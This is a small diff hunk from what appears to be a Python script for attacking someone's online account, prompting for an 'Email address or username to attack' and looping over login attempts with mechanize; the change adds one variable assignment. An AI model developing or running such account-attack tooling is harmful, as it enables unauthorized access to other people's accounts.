@@ -50,6 +50,7 @@ email = input('Email address or username to attack:')
 redo = 0
 reset = 999999
 newpass = soup.find(string="poop")
+test = newpass
 """password = input('Password:')"""
 while newpass == test:
   browser = mechanize.Browser()
